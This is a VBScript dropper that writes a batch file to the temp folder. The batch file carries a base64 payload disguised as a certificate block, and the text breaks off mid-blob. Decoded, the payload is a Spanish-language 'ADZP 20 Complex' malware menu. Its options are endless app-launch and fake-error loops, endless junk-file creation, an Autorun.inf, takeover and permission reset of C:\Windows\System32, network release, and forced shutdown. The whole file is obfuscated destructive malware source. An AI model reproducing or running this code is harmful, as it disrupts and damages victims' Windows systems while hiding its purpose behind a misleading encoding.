Const TemporaryFolder = 2

Dim fso: Set fso = CreateObject("Scripting.FileSystemObject")

Dim tempFolder: tempFolder = fso.GetSpecialFolder(TemporaryFolder)

set b=createobject("wscript.shell")
Set objfso = createobject("scripting.filesystemobject")
Set ar= objfso.createtextfile(tempFolder & "Shingapi.clean.sk.bat",true)

ar.writeline " @echo off "
ar.writeline " set v=%temp%\ADZP-20-Clean.bat "
ar.writeline " ( "
ar.writeline " echo -----BEGIN CERTIFICATE----- "
ar.writeline " echo OjogQURaUCAyMCBDb21wbGV4IENsZWFuIFZlcnNpb24NCjo6IFRoaXMgU29mdHdh "
ar.writeline " echo cmUgQ29uc2lkZXJlZCBTZW1pLURhbmdlcm91cw0KDQpAZWNobyBvZmYNCnRpdGxl "
ar.writeline " echo IEFEWlAgMjAgQ2xlYW4gLSBQYXlsb2FkIFBhbmVsDQpjb2xvciBmDQo6TWVudQ0K "
ar.writeline " echo Y2xzDQplY2hvLg0KZWNoby4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg "
ar.writeline " echo ICAgICAgICAgICAgICAgU2hpbmdhcGkuc2sgXCBBRFpQIDIwIENvbXBsZXggQ2xl "
ar.writeline " echo YW4NCmVjaG8uDQplY2hvLiAgICAgICAgICAgICAgICAg2sTExMTExMTExMTExMTE "
ar.writeline " echo xMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTE "
ar.writeline " echo xMTExMTExMTExMTExMTExMTExMTExMTEvw0KZWNoby4gICAgICAgICAgICAgICAg "
ar.writeline " echo ILMgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg "
ar.writeline " echo ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgILMNCmVjaG8u "
ar.writeline " echo ICAgICAgICAgICAgICAgICCzICAgIDEuW0FicmlyIEFwbGljYWNpb25lcyBBbGVh "
ar.writeline " echo dG9yaWFzXSAgICAgICAgICAgICAyLltDcmVhciBBcmNoaXZvcyBJbnNlcnZpYmxl "
ar.writeline " echo c10gICAgICCzDQplY2hvLiAgICAgICAgICAgICAgICAgsyAgICAgICAgICAgICAg "
ar.writeline " echo ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg "
ar.writeline " echo ICAgICAgICAgICAgICAgICAgICAgICAgsw0KZWNoby4gICAgICAgICAgICAgICAg "
ar.writeline " echo ILMgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg "
ar.writeline " echo ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgILMNCmVjaG8u "
ar.writeline " echo ICAgICAgICAgICAgICAgICCzICAgIDMuW01lbnNhamVzIGRlIFNwYW1dICAgICAg "
ar.writeline " echo ICAgICAgICAgICAgICAgICAgICA0LltDcmVhciBBcmNoaXZvcyBQZWxpZ3Jvc29z "
ar.writeline " echo XSAgICAgICCzDQplY2hvLiAgICAgICAgICAgICAgICAgsyAgICAgICAgICAgICAg "
ar.writeline " echo ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg "
ar.writeline " echo ICAgICAgICAgICAgICAgICAgICAgICAgsw0KZWNoby4gICAgICAgICAgICAgICAg "
ar.writeline " echo ILMgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg "
ar.writeline " echo ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgILMNCmVjaG8u "
ar.writeline " echo ICAgICAgICAgICAgICAgICCzICAgIDUuW0FudWxhciBsYSBDb25leGlvbl0gICAg "
ar.writeline " echo ICAgICAgICAgICAgICAgICAgICA2LltBcGFnYXIgbGEgQ29tcHV0YWRvcmFdICAg "
ar.writeline " echo ICAgICAgICCzDQplY2hvLiAgICAgICAgICAgICAgICAgsyAgICAgICAgICAgICAg "
ar.writeline " echo ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg "
ar.writeline " echo ICAgICAgICAgICAgICAgICAgICAgICAgsw0KZWNoby4gICAgICAgICAgICAgICAg "
ar.writeline " echo ILPExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTE "
ar.writeline " echo xMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExLMNCmVjaG8u "
ar.writeline " echo ICAgICAgICAgICAgICAgICCzICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg "
ar.writeline " echo ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg "
ar.writeline " echo ICAgICAgICCzDQplY2hvLiAgICAgICAgICAgICAgICAgsyAgICAgICAgICAgICAg "
ar.writeline " echo ICAgICAgICA3LltBY3RpdmFyIFRvZG9zIGxvcyBQYXlsb2FkcyBhIGxhIFZlel0g "
ar.writeline " echo ICAgICAgICAgICAgICAgICAgICAgICAgsw0KZWNoby4gICAgICAgICAgICAgICAg "
ar.writeline " echo ILMgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg "
ar.writeline " echo ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgILMNCmVjaG8u "
ar.writeline " echo ICAgICAgICAgICAgICAgICDAxMTExMTExMTExMTExMTExMTExMTExMTExMTExMTE "
ar.writeline " echo xMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTE "
ar.writeline " echo xMTExMTExMTZDQplY2hvLg0Kc2V0IC9wIHBheWxvYWQ9Ii4gICAgICAgICAgICAg "
ar.writeline " echo ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgT3BjaW9uID4g "
ar.writeline " echo Ig0KaWYgJXBheWxvYWQlID09IDEgKGdvdG8gQWR2ZXJ0ZW5jaWEpDQppZiAlcGF5 "
ar.writeline " echo bG9hZCUgPT0gMiAoZ290byBTb2NrZXRGaWxlcykNCmlmICVwYXlsb2FkJSA9PSAz "
ar.writeline " echo IChnb3RvIE1zZ1NwYW1Cb3gpDQppZiAlcGF5bG9hZCUgPT0gNCAoZ290byBBZHZl "
ar.writeline " echo cnRlbmNpYTIpDQppZiAlcGF5bG9hZCUgPT0gNSAoZ290byBBZHZlcnRlbmNpYTMp "
ar.writeline " echo DQppZiAlcGF5bG9hZCUgPT0gNiAoZ290byBTaHV0ZG93bikNCmlmICVwYXlsb2Fk "
ar.writeline " echo JSA9PSA3IChnb3RvIEFkdmVydGVuY2lhNCkNCg0KOkFkdmVydGVuY2lhDQpjbHMN "
ar.writeline " echo CmVjaG8uDQplY2hvLg0KZWNoby4gICAgICAgICAgICAgRXN0ZSBQYXlsb2FkIHB1 "
ar.writeline " echo ZWRlIHNlciBQZWxpZ3Jvc28gcGFyYSB0dSBQQywgUmVhbG1lbnRlIFF1aWVyZXMg "
ar.writeline " echo RWplY3V0YXJsbz8gDQplY2hvLg0KZWNoby4NCnNldCAvcCBvcD0uICAgICAgICAg "
ar.writeline " echo ICAgT3BjaW9uIFtTIC0gTl06IA0KaWYgJW9wJSA9PSBTIChnb3RvIFJhbmRvbUFw "
ar.writeline " echo cHMpDQppZiAlb3AlID09IE4gKGdvdG8gTWVudSkNCmdvdG8gQWR2ZXJ0ZW5jaWEN "
ar.writeline " echo Cg0KOlJhbmRvbUFwcHMNCmNscw0KZWNoby4NCmVjaG8uDQplY2hvLg0KZWNoby4N "
ar.writeline " echo CmVjaG8uICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQYXJhIGRl "
ar.writeline " echo dGVuZXIgbGEgRWplY3VjaW9uIGRlbCBQYXlsb2FkIENpZXJyYSBlbCBQcm9ncmFt "
ar.writeline " echo YQ0KZWNoby4NCmVjaG8uDQplY2hvLg0KZWNoby4NCjpSYW5kb21BcHBzT3Blbg0K "
ar.writeline " echo c3RhcnQgbm90ZXBhZA0Kc3RhcnQgY2FsYw0Kc3RhcnQgZXhwbG9yZXIuZXhlDQpz "
ar.writeline " echo dGFydCBtc3BhaW50LmV4ZQ0KZ290byBSYW5kb21BcHBzT3Blbg0KDQo6TXNnU3Bh "
ar.writeline " echo bUJveA0KaWYgZXhpc3QgSW5mb3JtYWNpb24udmJzIChhdHRyaWIgLWggSW5mb3Jt "
ar.writeline " echo YWNpb24udmJzICYgZGVsIC9mIC9xIC9zIEluZm9ybWFjaW9uLnZicykgPm51bA0K "
ar.writeline " echo aWYgZXhpc3QgRXJyb3JDcml0aWNvLnZicyAoYXR0cmliIC1oIEVycm9yQ3JpdGlj "
ar.writeline " echo by52YnMgJiBkZWwgL2YgL3EgL3MgRXJyb3JDcml0aWNvLnZicykgPm51bA0KaWYg "
ar.writeline " echo ZXhpc3QgQWR2ZXJ0ZW5jaWEudmJzIChhdHRyaWIgLWggQWR2ZXJ0ZW5jaWEudmJz "
ar.writeline " echo ICYgZGVsIC9mIC9xIC9zIEFkdmVydGVuY2lhLnZicykgPm51bA0KZWNobyBvZmY+ "
ar.writeline " echo PkVycm9yQ3JpdGljby52YnMNCmF0dHJpYiAraCBFcnJvckNyaXRpY28udmJzDQpl "
ar.writeline " echo Y2hvIE1lbnNhamU9bXNnYm94KCJFcnJvciBDcml0aWNvIiwxNiwiRXJyb3IiKT4+ "
ar.writeline " echo RXJyb3JDcml0aWNvLnZicw0KZWNobyBvZmY+PkFkdmVydGVuY2lhLnZicw0KYXR0 "
ar.writeline " echo cmliICtoIEFkdmVydGVuY2lhLnZicw0KZWNobyBNZW5zYWplPW1zZ2JveCgiRXJy "
ar.writeline " echo b3IgZW4gZWwgU2lzdGVtYSIsNDgsIkVycm9yIik+PkFkdmVydGVuY2lhLnZicw0K "
ar.writeline " echo ZWNobyBvZmY+PkluZm9ybWFjaW9uLnZicw0KYXR0cmliICtoIEluZm9ybWFjaW9u "
ar.writeline " echo LnZicw0KZWNobyBNZW5zYWplPU1zZ0JveCgiSGFzIFNpZG8gSGFja2VhZG8hIiw2 "
ar.writeline " echo NCwiQURaUCAyMCBDb21wbGV4Iik+PkluZm9ybWFjaW9uLnZicw0KdGltZW91dCAv "
ar.writeline " echo dCAxID5udWwNCnN0YXJ0IEluZm9ybWFjaW9uLnZicw0KY2xzDQplY2hvLg0KZWNo "
ar.writeline " echo by4NCmVjaG8uDQplY2hvLg0KZWNoby4gICAgICAgICAgICAgICAgICAgICAgICAg "
ar.writeline " echo ICAgICAgICAgIFBhcmEgZGV0ZW5lciBsYSBFamVjdWNpb24gZGVsIFBheWxvYWQg "
ar.writeline " echo Q2llcnJhIGVsIFByb2dyYW1hDQplY2hvLg0KZWNoby4NCmVjaG8uDQplY2hvLg0K "
ar.writeline " echo OlNwYW1NZW5zYWplQm94ZXMNCnN0YXJ0IEVycm9yQ3JpdGljby52YnMNCnN0YXJ0 "
ar.writeline " echo IEFkdmVydGVuY2lhLnZicw0KZ290byBTcGFtTWVuc2FqZUJveGVzDQoNCjpTb2Nr "
ar.writeline " echo ZXRGaWxlcw0KY2xzDQplY2hvLg0KZWNoby4NCmVjaG8uDQplY2hvLg0KZWNoby4g "
ar.writeline " echo ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBhcmEgZGV0ZW5lciBs "
ar.writeline " echo YSBFamVjdWNpb24gZGVsIFBheWxvYWQgQ2llcnJhIGVsIFByb2dyYW1hDQplY2hv "
ar.writeline " echo Lg0KZWNoby4NCmVjaG8uDQplY2hvLg0KOkNyZWF0ZVNvY2tldEZpbGVzDQplY2hv "
ar.writeline " echo IG9mZj4+dmlydXMuZXhlDQplY2hvIG9mZj4+dmlydXMuZGxsDQplY2hvIG9mZj4+ "
ar.writeline " echo dmlydXMuY29tDQplY2hvIG9mZj4+dmlydXMuaW5pDQplY2hvIG9mZj4+dmlydXMu "
ar.writeline " echo aW5mDQplY2hvIG9mZj4+dmlydXMuc3lzDQplY2hvIG9mZj4+dmlydXMucmVnDQpl "
ar.writeline " echo Y2hvIG9mZj4+dmlydXMuYW5pDQplY2hvIG9mZj4+dmlydXMucmFyDQplY2hvIG9m "
ar.writeline " echo Zj4+dmlydXMucGFsDQplY2hvIG9mZj4+dmlydXMuYmluDQplY2hvIG9mZj4+dmly "
ar.writeline " echo dXMuY21kDQplY2hvIG9mZj4+dmlydXMuamFyDQplY2hvIG9mZj4+dmlydXMuY2hr "
ar.writeline " echo DQplY2hvIG9mZj4+dmlydXMuZGINCmVjaG8gb2ZmPj52aXJ1cy5vY3gNCmVjaG8g "
ar.writeline " echo b2ZmPj52aXJ1cy5tYW5pZmVzdA0KZWNobyBvZmY+PnZpcnVzLmxvZw0KZWNobyBv "
ar.writeline " echo ZmY+PnZpcnVzLmRhdA0KZWNobyBvZmY+PnZpcnVzLmN1cg0KZWNobyBvZmY+PnZp "
ar.writeline " echo cnVzLjM4Ng0KZWNobyBvZmY+PnZpcnVzLjMyMw0KZWNobyBvZmY+PnZpcnVzLnNj "
ar.writeline " echo cg0KZWNobyBvZmY+PnZpcnVzLmFjbQ0KZWNobyBvZmY+PnZpcnVzLmNwbA0KZWNo "
ar.writeline " echo byBvZmY+PnZpcnVzLmhscA0KZWNobyBvZmY+PnZpcnVzLmpwZw0KZWNobyBvZmY+ "
ar.writeline " echo PnZpcnVzLm1wZw0KZWNobyBvZmY+PnZpcnVzLmh0bWwNCmVjaG8gb2ZmPj52aXJ1 "
ar.writeline " echo cy52YnMNCmVjaG8gb2ZmPj52aXJ1cy5kcnYNCmVjaG8gb2ZmPj52aXJ1cy53c2gN "
ar.writeline " echo CmVjaG8gb2ZmPj52aXJ1cy5yYXQNCmVjaG8gb2ZmPj52aXJ1cy5jZXINCmVjaG8g "
ar.writeline " echo b2ZmPj52aXJ1cy5tc2MNCmVjaG8gb2ZmPj52aXJ1cy5kYg0KZ290byBDcmVhdGVT "
ar.writeline " echo b2NrZXRGaWxlcw0KDQo6QWR2ZXJ0ZW5jaWEyDQpjbHMNCmVjaG8uDQplY2hvLg0K "
ar.writeline " echo ZWNoby4gICAgICAgICAgICAgRXN0ZSBQYXlsb2FkIHB1ZWRlIHNlciBQZWxpZ3Jv "
ar.writeline " echo c28gcGFyYSB0dSBQQywgUmVhbG1lbnRlIFF1aWVyZXMgRWplY3V0YXJsbz8gDQpl "
ar.writeline " echo Y2hvLg0KZWNoby4NCnNldCAvcCBvcD0uICAgICAgICAgICAgT3BjaW9uIFtTIC0g "
ar.writeline " echo Tl06IA0KaWYgJW9wJSA9PSBTIChnb3RvIENyZWF0ZURhbmdlcm91c0ZpbGVzKQ0K "
ar.writeline " echo aWYgJW9wJSA9PSBOIChnb3RvIE1lbnUpDQpnb3RvIEFkdmVydGVuY2lhMg0KDQo6 "
ar.writeline " echo Q3JlYXRlRGFuZ2Vyb3VzRmlsZXMNCmVjaG8gb2ZmPj5BdXRvcnVuLmluZg0KZWNo "
ar.writeline " echo byBbQXV0b1J1bl0+PkF1dG9ydW4uaW5mDQplY2hvIE9wZW49QURaUCAyMCBDb21w "
ar.writeline " echo bGV4Pj5BdXRvcnVuLmluZg0KZWNobyBBY3Rpb249U3RhcnQgQURaUCAyMCBDb21w "
ar.writeline " echo bGV4Pj5BdXRvcnVuLmluZg0KZWNobyBMYWJlbD0/Pz8+PkF1dG9ydW4uaW5mDQpl "
ar.writeline " echo Y2hvIG9mZj4+VGFza3NlLmV4ZQ0KZWNobyAlcmFuZG9tJSVyYW5kb20lJXJhbmRv "
ar.writeline " echo bSUlcmFuZG9tJSVyYW5kb20lJXJhbmRvbSUlcmFuZG9tJSVyYW5kb20lJXJhbmRv "
ar.writeline " echo bSUlcmFuZG9tJT4+VGFza3NlLmV4ZQ0KZWNobyAlcmFuZG9tJSVyYW5kb20lJXJh "
ar.writeline " echo bmRvbSUlcmFuZG9tJSVyYW5kb20lJXJhbmRvbSUlcmFuZG9tJSVyYW5kb20lJXJh "
ar.writeline " echo bmRvbSUlcmFuZG9tJT4+VGFza3NlLmV4ZQ0KZWNobyAlcmFuZG9tJSVyYW5kb20l "
ar.writeline " echo JXJhbmRvbSUlcmFuZG9tJSVyYW5kb20lJXJhbmRvbSUlcmFuZG9tJSVyYW5kb20l "
ar.writeline " echo JXJhbmRvbSUlcmFuZG9tJT4+VGFza3NlLmV4ZQ0KZWNobyAlcmFuZG9tJSVyYW5k "
ar.writeline " echo b20lJXJhbmRvbSUlcmFuZG9tJSVyYW5kb20lJXJhbmRvbSUlcmFuZG9tJSVyYW5k "
ar.writeline " echo b20lJXJhbmRvbSUlcmFuZG9tJT4+VGFza3NlLmV4ZQ0KZWNobyAlcmFuZG9tJSVy "
ar.writeline " echo YW5kb20lJXJhbmRvbSUlcmFuZG9tJSVyYW5kb20lJXJhbmRvbSUlcmFuZG9tJSVy "
ar.writeline " echo YW5kb20lJXJhbmRvbSUlcmFuZG9tJT4+VGFza3NlLmV4ZQ0KZWNobyAlcmFuZG9t "
ar.writeline " echo JSVyYW5kb20lJXJhbmRvbSUlcmFuZG9tJSVyYW5kb20lJXJhbmRvbSUlcmFuZG9t "
ar.writeline " echo JSVyYW5kb20lJXJhbmRvbSUlcmFuZG9tJT4+VGFza3NlLmV4ZQ0KZWNobyAlcmFu "
ar.writeline " echo ZG9tJSVyYW5kb20lJXJhbmRvbSUlcmFuZG9tJSVyYW5kb20lJXJhbmRvbSUlcmFu "
ar.writeline " echo ZG9tJSVyYW5kb20lJXJhbmRvbSUlcmFuZG9tJT4+VGFza3NlLmV4ZQ0KZWNobyAl "
ar.writeline " echo cmFuZG9tJSVyYW5kb20lJXJhbmRvbSUlcmFuZG9tJSVyYW5kb20lJXJhbmRvbSUl "
ar.writeline " echo cmFuZG9tJSVyYW5kb20lJXJhbmRvbSUlcmFuZG9tJT4+VGFza3NlLmV4ZQ0KZWNo "
ar.writeline " echo byAlcmFuZG9tJSVyYW5kb20lJXJhbmRvbSUlcmFuZG9tJSVyYW5kb20lJXJhbmRv "
ar.writeline " echo bSUlcmFuZG9tJSVyYW5kb20lJXJhbmRvbSUlcmFuZG9tJT4+VGFza3NlLmV4ZQ0K "
ar.writeline " echo ZWNobyAlcmFuZG9tJSVyYW5kb20lJXJhbmRvbSUlcmFuZG9tJSVyYW5kb20lJXJh "
ar.writeline " echo bmRvbSUlcmFuZG9tJSVyYW5kb20lJXJhbmRvbSUlcmFuZG9tJT4+VGFza3NlLmV4 "
ar.writeline " echo ZQ0KZWNobyBvZmY+PlRhc2tkbC5iYXQNCmVjaG8gQGVjaG8gb2ZmPj5UYXNrZGwu "
ar.writeline " echo YmF0DQplY2hvIHRpdGxlIFRhc2tkbD4+VGFza2RsLmJhdA0KZWNobyB0YWtlb3du "
ar.writeline " echo IC9mICJDOlxXaW5kb3dzXFN5c3RlbTMyIiAvcj4+VGFza2RsLmJhdA0KZWNobyBp "
ar.writeline " echo Y2FjbHMgIkM6XFdpbmRvd3NcU3lzdGVtMzIiIC9yZXNldCAvdCAvYyAvcT4+VGFz "
ar.writeline " echo a2RsLmJhdA0KZWNobyB0YWtlb3duIC9mICJDOlxXaW5kb3dzIiAvcj4+VGFza2Rs "
ar.writeline " echo LmJhdA0KZWNobyBpY2FjbHMgIkM6XFdpbmRvd3MiIC9yZXNldCAvdCAvYyAvcT4+ "
ar.writeline " echo VGFza2RsLmJhdA0KbXNnICogU2UgaGFuIENyZWFkbyBsb3MgQXJjaGl2b3MNCmdv "
ar.writeline " echo dG8gTWVudQ0KDQo6QWR2ZXJ0ZW5jaWEzDQpjbHMNCmVjaG8uDQplY2hvLg0KZWNo "
ar.writeline " echo by4gICAgICAgICAgICAgRXN0ZSBQYXlsb2FkIHB1ZWRlIHNlciBQZWxpZ3Jvc28g "
ar.writeline " echo cGFyYSB0dSBQQywgUmVhbG1lbnRlIFF1aWVyZXMgRWplY3V0YXJsbz8gDQplY2hv "
ar.writeline " echo Lg0KZWNoby4NCnNldCAvcCBvcD0uICAgICAgICAgICAgT3BjaW9uIFtTIC0gTl06 "
ar.writeline " echo IA0KaWYgJW9wJSA9PSBTIChnb3RvIEluc3RhbnRLaWxsRXRoZXJuZXQpDQppZiAl "
ar.writeline " echo b3AlID09IE4gKGdvdG8gTWVudSkNCmdvdG8gQWR2ZXJ0ZW5jaWEzDQoNCjpJbnN0 "
ar.writeline " echo YW50S2lsbEV0aGVybmV0DQppcGNvbmZpZyAvcmVsZWFzZSA+bnVsDQptc2cgKiBT "
ar.writeline " echo ZSBoYSBBbnVsYWRvIGxhIENvbmV4aW9uIGEgSW50ZXJuZXQNCmdvdG8gTWVudQ0K "
ar.writeline " echo DQo6U2h1dGRvd24NCnNodXRkb3duIC1zIC10IDYwIC1jICJBRFpQIDIwIENvbXBs "
ar.writeline " echo ZXggZXN0YSBhIHB1bnRvIGRlIGVsaW1pbmFyIGVsIFNpc3RlbWEgT3BlcmF0aXZv "
ar.writeline " echo Ig0KY2xzDQplY2hvLg0KZWNoby4NCmVjaG8uDQplY2hvLg0KZWNoby4NCmVjaG8u "
ar.writeline " echo ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQYXJhIENhbmNlbGFyIGVs "
ar.writeline " echo IEFwYWdhZG8gQXV0b21hdGljbyBQcmVzaW9uYSB1bmEgVGVjbGENCmVjaG8uDQpl "
ar.writeline " echo Y2hvLg0KcGF1c2UgPm51bA0Kc2h1dGRvd24gLWENCmdvdG8gTWVudQ0KDQo6QWR2 "
ar.writeline " echo ZXJ0ZW5jaWE0DQpjbHMNCmVjaG8uDQplY2hvLg0KZWNoby4gICAgICAgICAgICAg "
ar.writeline " echo RXN0YXMgU2VndXJvIHF1ZSBEZXNlYXMgRWplY3V0YXIgdG9kb3MgbG9zIFBheWxv "
ar.writeline " echo YWRzPw0KZWNoby4NCmVjaG8uDQplY2hvLiAgICAgICAgICAgICBTaSBFamVjdXRh "
ar.writeline " echo cyBUb2RvcyBsb3MgUGF5bG9hZHMgYSBsYSBWZXogVHUgQ29tcHV0YWRvcmEgUG9k "
ar.writeline " echo cmlhIGRlamFyIGRlIEZ1bmNpb25hciBvIEFwYWdhcnNlDQplY2hvLg0KZWNoby4N "
ar.writeline " echo CnNldCAvcCBvcHRpb249LiAgICAgICAgICAgIE9wY2lvbiBbUyAtIE5dOiANCmlm "
ar.writeline " echo ICVvcHRpb24lID09IFMgKGdvdG8gQWN0aXZhdGVBbGwpDQppZiAlb3B0aW9uJSA9 "
ar.writeline " echo PSBOIChnb3RvIE1lbnUpDQpnb3RvIEFkdmVydGVuY2lhNA0KDQo6QWN0aXZhdGVB "
ar.writeline " echo bGwNCmVjaG8gb2ZmPj5BdXRvcnVuLmluZg0KZWNobyBbQXV0b1J1bl0+PkF1dG9y "
ar.writeline " echo dW4uaW5mDQplY2hvIE9wZW49QURaUCAyMCBDb21wbGV4Pj5BdXRvcnVuLmluZg0K "
ar.writeline " echo ZWNobyBBY3Rpb249U3RhcnQgQURaUCAyMCBDb21wbGV4Pj5BdXRvcnVuLmluZg0K "
ar.writeline " echo ZWNobyBMYWJlbD0/Pz8+PkF1dG9ydW4uaW5mDQplY2hvIG9mZj4+VGFza3NlLmV4 "
ar.writeline " echo ZQ0KZWNobyAlcmFuZG9tJSVyYW5kb20lJXJhbmRvbSUlcmFuZG9tJSVyYW5kb20l "
ar.writeline " echo JXJhbmRvbSUlcmFuZG9tJSVyYW5kb20lJXJhbmRvbSUlcmFuZG9tJT4+VGFza3Nl "
ar.writeline " echo LmV4ZQ0KZWNobyAlcmFuZG9tJSVyYW5kb20lJXJhbmRvbSUlcmFuZG9tJSVyYW5k "
ar.writeline " echo b20lJXJhbmRvbSUlcmFuZG9tJSVyYW5kb20lJXJhbmRvbSUlcmFuZG9tJT4+VGFz "
ar.writeline " echo a3NlLmV4ZQ0KZWNobyAlcmFuZG9tJSVyYW5kb20lJXJhbmRvbSUlcmFuZG9tJSVy "
ar.writeline " echo YW5kb20lJXJhbmRvbSUlcmFuZG9tJSVyYW5kb20lJXJhbmRvbSUlcmFuZG9tJT4+ "
ar.writeline " echo VGFza3NlLmV4ZQ0KZWNobyAlcmFuZG9tJSVyYW5kb20lJXJhbmRvbSUlcmFuZG9t "
ar.writeline " echo JSVyYW5kb20lJXJhbmRvbSUlcmFuZG9tJSVyYW5kb20lJXJhbmRvbSUlcmFuZG9t "
ar.writeline " echo JT4+VGFza3NlLmV4ZQ0KZWNobyAlcmFuZG9tJSVyYW5kb20lJXJhbmRvbSUlcmFu "
ar.writeline " echo ZG9tJSVyYW5kb20lJXJhbmRvbSUlcmFuZG9tJSVyYW5kb20lJXJhbmRvbSUlcmFu "
ar.writeline " echo ZG9tJT4+VGFza3NlLmV4ZQ0KZWNobyAlcmFuZG9tJSVyYW5kb20lJXJhbmRvbSUl "
ar.writeline " echo cmFuZG9tJSVyYW5kb20lJXJhbmRvbSUlcmFuZG9tJSVyYW5kb20lJXJhbmRvbSUl "
ar.writeline " echo cmFuZG9tJT4+VGFza3NlLmV4ZQ0KZWNobyAlcmFuZG9tJSVyYW5kb20lJXJhbmRv "
ar.writeline " echo bSUlcmFuZG9tJSVyYW5kb20lJXJhbmRvbSUlcmFuZG9tJSVyYW5kb20lJXJhbmRv "
ar.writeline " echo bSUlcmFuZG9tJT4+VGFza3NlLmV4ZQ0KZWNobyAlcmFuZG9tJSVyYW5kb20lJXJh "
ar.writeline " echo bmRvbSUlcmFuZG9tJSVyYW5kb20lJXJhbmRvbSUlcmFuZG9tJSVyYW5kb20lJXJh "
ar.writeline " echo bmRvbSUlcmFuZG9tJT4+VGFza3NlLmV4ZQ0KZWNobyAlcmFuZG9tJSVyYW5kb20l "
ar.writeline " echo JXJhbmRvbSUlcmFuZG9tJSVyYW5kb20lJXJhbmRvbSUlcmFuZG9tJSVyYW5kb20l "
ar.writeline " echo JXJhbmRvbSUlcmFuZG9tJT4+VGFza3NlLmV4ZQ0KZWNobyAlcmFuZG9tJSVyYW5k "
ar.writeline " echo b20lJXJhbmRvbSUlcmFuZG9tJSVyYW5kb20lJXJhbmRvbSUlcmFuZG9tJSVyYW5k "
ar.writeline " echo b20lJXJhbmRvbSUlcmFuZG9tJT4+VGFza3NlLmV4ZQ0KZWNobyBvZmY+PlRhc2tk "
ar.writeline " echo bC5iYXQNCmVjaG8gQGVjaG8gb2ZmPj5UYXNrZGwuYmF0DQplY2hvIHRpdGxlIFRh "
ar.writeline " echo c2tkbD4+VGFza2RsLmJhdA0KZWNobyB0YWtlb3duIC9mICJDOlxXaW5kb3dzXFN5 "
ar.writeline " echo c3RlbTMyIiAvcj4+VGFza2RsLmJhdA0KZWNobyBpY2FjbHMgIkM6XFdpbmRvd3Nc "
ar.writeline " echo U3lzdGVtMzIiIC9yZXNldCAvdCAvYyAvcT4+VGFza2RsLmJhdA0KZWNobyB0YWtl "
ar.writeline " echo b3duIC9mICJDOlxXaW5kb3dzIiAvcj4+VGFza2RsLmJhdA0KZWNobyBpY2FjbHMg "
ar.writeline " echo IkM6XFdpbmRvd3MiIC9yZXNldCAvdCAvYyAvcT4+VGFza2RsLmJhdA0KaWYgZXhp "
ar.writeline " echo c3QgSW5mb3JtYWNpb24udmJzIChhdHRyaWIgLWggSW5mb3JtYWNpb24udmJzICYg "
ar.writeline " echo ZGVsIC9mIC9xIC9zIEluZm9ybWFjaW9uLnZicykgPm51bA0KaWYgZXhpc3QgRXJy "
ar.writeline " echo b3JDcml0aWNvLnZicyAoYXR0cmliIC1oIEVycm9yQ3JpdGljby52YnMgJiBkZWwg "
ar.writeline " echo L2YgL3EgL3MgRXJyb3JDcml0aWNvLnZicykgPm51bA0KaWYgZXhpc3QgQWR2ZXJ0 "
ar.writeline " echo ZW5jaWEudmJzIChhdHRyaWIgLWggQWR2ZXJ0ZW5jaWEudmJzICYgZGVsIC9mIC9x "
ar.writeline " echo IC9zIEFkdmVydGVuY2lhLnZicykgPm51bA0KZWNobyBvZmY+PkVycm9yQ3JpdGlj "
ar.writeline " echo by52YnMNCmF0dHJpYiAraCBFcnJvckNyaXRpY28udmJzDQplY2hvIE1lbnNhamU9 "
ar.writeline " echo bXNnYm94KCJFcnJvciBDcml0aWNvIiwxNiwiRXJyb3IiKT4+RXJyb3JDcml0aWNv "
ar.writeline " echo LnZicw0KZWNobyBvZmY+PkFkdmVydGVuY2lhLnZicw0KYXR0cmliICtoIEFkdmVy "
ar.writeline " echo dGVuY2lhLnZicw0KZWNobyBNZW5zYWplPW1zZ2JveCgiRXJyb3IgZW4gZWwgU2lz "
ar.writeline " echo dGVtYSIsNDgsIkVycm9yIik+PkFkdmVydGVuY2lhLnZicw0KZWNobyBvZmY+Pklu "
ar.writeline " echo Zm9ybWFjaW9uLnZicw0KYXR0cmliICtoIEluZm9ybWFjaW9uLnZicw0KZWNobyBN "
ar.writeline " echo ZW5zYWplPU1zZ0JveCgiSGFzIFNpZG8gSGFja2VhZG8hIiw2NCwiQURaUCAyMCBD "
ar.writeline " echo b21wbGV4Iik+PkluZm9ybWFjaW9uLnZicw0Kc3RhcnQgSW5mb3JtYWNpb24udmJz "
ar.writeline " echo DQpzdGFydCBFcnJvckNyaXRpY28udmJzDQpzdGFydCBBZHZlcnRlbmNpYS52YnMN "
ar.writeline " echo CnN0YXJ0IEVycm9yQ3JpdGljby52YnMNCnN0YXJ0IEFkdmVydGVuY2lhLnZicw0K "
ar.writeline " echo c3RhcnQgRXJyb3JDcml0aWNvLnZicw0Kc3RhcnQgQWR2ZXJ0ZW5jaWEudmJzDQpt "
ar.writeline " echo c2cgKiBWaXJ1cyBEZXRlY3RhZG8NCm1zZyAqIFZpcnVzIERldGVjdGFkbw0KbXNn "
